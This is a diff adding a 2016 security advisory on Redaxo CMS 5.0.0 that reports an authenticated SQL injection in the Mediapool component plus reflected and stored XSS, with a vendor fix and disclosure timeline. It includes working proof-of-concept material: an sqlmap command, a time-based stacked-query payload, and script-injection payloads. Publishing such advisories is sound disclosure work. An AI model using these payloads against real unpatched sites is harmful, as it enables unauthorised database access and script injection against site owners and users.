@@ -1,0 +1,70 @@
+=== LSE Leading Security Experts GmbH - Security Advisory 2016-01-18 ===
+
+Redaxo CMS contains multiple vulnerabilities
+-------------------------------------------------------------
+
+Problem Overview
+================
+Technical Risk: high
+Likelihood of Exploitation: medium
+Vendor: https://www.redaxo.org/
+Tested version: Redaxo CMS v5.0.0
+Credits: LSE Leading Security Experts GmbH employee Tim Herres
+Advisory URL: https://www.lsexperts.de/advisories/lse-2016-01-18.txt
+Advisory Status: Public
+CVE-Number: na
+
+Impact
+======
+Redaxo is an easy to use open source content management system. A user can create his own website using the Redaxo CMS.
+During internal research, multiple vulnerabilities were identified in the Redaxo CMS software.
+The software is vulnerable to an SQL-Injection attack, allowing an authenticated user to access the database in an unsafe way.
+Some parts of the application do not have sufficient input validation and output encoding. This means user supplied input is inserted in an unsafe way
+resulting in a Cross Site Scripting vulnerability.
+
+Issue Description
+=================
+The following vulnerabilities are only examples. It is highly recommended to check the whole application for similar vulnerabilities.
+1) SQL Injection in the "Mediapool" component:
+Authentication required: yes
+User needs access to the "Mediapool".
+
+POC:
+Exploitation using SQL Map
+sqlmap -u "https://127.0.0.1/redaxo/index.php?page=mediapool%2fmedia&rex_file_category=0&media_name=blub&undefined=%0d" --cookie="PHPSESSID=h9s74l660iongtg71bpkjup0d1" -p media_name
+
+Parameter: media_name (GET)
+Type: stacked queries
+Title: MySQL > 5.0.11 stacked queries (SELECT - comment)
+Payload: page=mediapool/media&rex_file_category=0&media_name=test');(SELECT * FROM (SELECT(SLEEP(5)))jbWV)#&undefined=
+
+2) Reflected XSS
+Authentication required: yes
+Used browser: FF42
+Example:
+https://127.0.0.1/redaxo/index.php?page=mediapool/media&info=Datei+tot.<script>alert("xss");</script>&opener_input_field=
+
+3) Stored XSS (persistent XSS)
+Authentication required: yes
+Used browser: FF42
+It is possible to store JavaScript Code in input fields.
+Example:
+Menu --> "Mediapool" --> "Media Category Managing" --> Add --> Name field
+Payload:<script>alert("xss")</script>
+Response:
+[...]
+[...]href="index.php?page=mediapool/structure&cat_id=801"><script>alert("xss");</script></a></li></ol></div><section class="rex-page-sectio
+[...]
+
+
+Temporary Workaround and Fix
+============================
+Update to Version 5.0.1
+
+History
+=======
+2016-01-18  Issues discovered
+2016-01-29  Vendor contacted
+2016-02-05  Vendor confirmed
+2016-02-09  Vendor released patch
+2016-02-16  Advisory released
